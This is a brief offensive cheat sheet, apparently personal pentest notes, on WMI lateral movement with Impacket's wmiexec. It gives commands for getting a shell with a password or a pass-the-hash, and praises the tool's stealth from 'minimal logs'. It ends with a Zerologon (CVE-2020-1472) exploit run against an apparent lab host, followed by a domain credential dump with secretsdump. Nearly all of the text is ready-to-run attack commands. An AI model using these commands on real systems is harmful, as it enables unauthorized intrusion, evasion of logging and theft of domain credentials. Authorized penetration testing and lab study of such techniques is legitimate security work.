### WMI
```
Tool: wmiexec.py (from Impacket)
Shell Type: Interactive Shell
Required Ports: 135 RCP Endpoint Mapper, 49152–65535: Dynamic RPC Ports.
```
Pros and Cons
```
Advantages:
Stealthy: Generates minimal logs.
No files or service creation required.
Frequently used in legitimate administrative tasks, reducing suspicion.

Limitations:
Requires open RPC ports (135 + dynamic ports).
Requires local administrator privileges on the target system.
May be blocked by strict firewall configurations.
```
###### Get Shell
```
impacket-wmiexec domain/username:password@ip
impacket-wmiexec -hashes LMHASH:NTHASH domain/username@ip
```

###### Connecting with authentication
```
impacket-wmiexec domain/'':''@ip
```
###### NXC Module CVE-2020-1472
![image](https://github.com/user-attachments/assets/3d7dc036-4432-4c5b-bc94-e39c4d5a2d5d)
```
python3 cve-2020-1472-exploit.py Monteverde 10.10.10.172
impacket-secretsdump 'megabank.local'/'Monteverde$'@10.10.10.172 -just-dc -no-pass 
```
